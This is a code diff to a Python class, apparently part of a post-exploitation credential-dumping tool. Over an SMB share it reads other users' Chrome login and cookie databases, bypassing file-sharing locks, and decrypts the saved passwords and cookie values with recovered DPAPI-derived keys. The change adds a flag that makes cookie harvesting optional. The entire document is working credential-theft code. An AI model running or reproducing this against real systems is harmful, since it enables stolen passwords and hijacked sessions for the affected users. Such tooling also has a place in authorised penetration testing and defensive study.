@@ -103,13 +103,13 @@ class BrowserTriage:
         self.looted_files = dict()
         self.masterkeys = masterkeys
 
-    def triage_browsers(self) -> Tuple[List[LoginData], List[Cookie]]:
+    def triage_browsers(self, gather_cookies:bool = False) -> Tuple[List[LoginData], List[Cookie]]:
         credentials = list()
         cookies = list()
 
         for user in self.users:
             try:
-                user_credentials, user_cookies=self.triage_browsers_for_user(user)
+                user_credentials, user_cookies=self.triage_browsers_for_user(user, gather_cookies)
                 credentials += user_credentials
                 cookies += user_cookies
             except Exception as e:
@@ -120,10 +120,10 @@ class BrowserTriage:
                 pass
         return credentials, cookies
 
-    def triage_browsers_for_user(self, user: str) -> Tuple[List[LoginData], List[Cookie]]:
-        return self.triage_chrome_browsers_for_user(user=user)
+    def triage_browsers_for_user(self, user: str, gather_cookies:bool = False) -> Tuple[List[LoginData], List[Cookie]]:
+        return self.triage_chrome_browsers_for_user(user=user, gather_cookies=gather_cookies)
 
-    def triage_chrome_browsers_for_user(self,user:str) -> Tuple[List[LoginData], List[Cookie]]:
+    def triage_chrome_browsers_for_user(self,user:str, gather_cookies:bool = False) -> Tuple[List[LoginData], List[Cookie]]:
         credentials = list()
         cookies = list()
         for browser,paths in self.user_generic_chrome_paths.items():
@@ -159,32 +159,33 @@ class BrowserTriage:
                             username=username, 
                             password=password))
                 fh.close()
-            for cookiepath in paths['cookiesDataPath']:
-                cookiesData_bytes = self.conn.readFile(shareName=self.share, path=cookiepath % user, bypass_shared_violation=True)
-                if aeskey is not None and cookiesData_bytes is not None and len(cookiesData_bytes) > 0:
-                    fh = tempfile.NamedTemporaryFile()
-                    fh.write(cookiesData_bytes)
-                    fh.seek(0)
-                    db = sqlite3.connect(fh.name)
-                    cursor = db.cursor()
-                    query = cursor.execute(
-                        'SELECT creation_utc, host_key, name, path, expires_utc, last_access_utc, encrypted_value FROM cookies')
-                    lines = query.fetchall()
-                    if len(lines) > 0:
-                        for creation_utc, host, name, path, expires_utc, last_access_utc, encrypted_cookie in lines:
-                            cookie = decrypt_chrome_password(encrypted_cookie, aeskey)
-                            cookies.append(Cookie(
-                                winuser=user,
-                                browser=browser,
-                                host=host,
-                                path=path,
-                                cookie_name=name,
-                                cookie_value=cookie,
-                                creation_utc=creation_utc,
-                                expires_utc=expires_utc,
-                                last_access_utc=last_access_utc))
-                    fh.close()
-                    break
+            if gather_cookies:
+                for cookiepath in paths['cookiesDataPath']:
+                    cookiesData_bytes = self.conn.readFile(shareName=self.share, path=cookiepath % user, bypass_shared_violation=True)
+                    if aeskey is not None and cookiesData_bytes is not None and len(cookiesData_bytes) > 0:
+                        fh = tempfile.NamedTemporaryFile()
+                        fh.write(cookiesData_bytes)
+                        fh.seek(0)
+                        db = sqlite3.connect(fh.name)
+                        cursor = db.cursor()
+                        query = cursor.execute(
+                            'SELECT creation_utc, host_key, name, path, expires_utc, last_access_utc, encrypted_value FROM cookies')
+                        lines = query.fetchall()
+                        if len(lines) > 0:
+                            for creation_utc, host, name, path, expires_utc, last_access_utc, encrypted_cookie in lines:
+                                cookie = decrypt_chrome_password(encrypted_cookie, aeskey)
+                                cookies.append(Cookie(
+                                    winuser=user,
+                                    browser=browser,
+                                    host=host,
+                                    path=path,
+                                    cookie_name=name,
+                                    cookie_value=cookie,
+                                    creation_utc=creation_utc,
+                                    expires_utc=expires_utc,
+                                    last_access_utc=last_access_utc))
+                        fh.close()
+                        break
         return credentials, cookies
 
     # def readFile_through_wmi(self, shareName, filepath):
